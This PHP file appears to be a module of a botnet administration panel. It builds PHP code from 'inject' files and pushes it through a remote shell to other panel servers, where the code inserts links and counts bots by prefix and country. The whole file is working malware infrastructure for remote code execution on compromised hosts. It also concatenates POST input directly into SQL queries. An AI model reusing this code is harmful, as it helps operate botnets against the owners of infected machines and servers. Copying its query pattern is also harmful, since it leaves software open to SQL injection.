<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
		$get_php = '$cur_file = \''.$result->shell.'\';';
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');

		if(!empty($_POST['submit'])){			$get_php .= '$mysqli->real_query("INSERT INTO bf_links (link, dev) VALUES (\''.$_POST['link'].'\', \''.$_POST['dev'].'\')");';

			$data = get_http($result->link, $get_php, $result->keyid, $result->shell);
			print_r($data);
		}else{
			$get_php .= '$data = array(); ';

			$get_php .= '$r = $mysqli->query("SELECT code FROM bf_country ORDER by code ASC");';
			$get_php .= '$data[\'c\'] = array();';
			$get_php .= 'while($row = $r->fetch_object()){ ';
			$get_php .= '$data[\'c\'][] = $row;';
			$get_php .= ' } ';

			$get_php .= '$r = $mysqli->query("SELECT prefix, COUNT(id) count FROM bf_bots GROUP by prefix"); ';
			$get_php .= '$data[\'p\'] = array(); ';
			$get_php .= 'while($row = $r->fetch_object()){ ';
			$get_php .= '$data[\'p\'][] = $row; ';
			$get_php .= ' }';

			$get_php .= 'print(json_encode($data)); ';
			$data = get_http($result->link, $get_php, $result->keyid, $result->shell);

			$smarty->assign('data', json_decode($data));
		}

		$smarty->assign('admin', $result);
	}
}

?>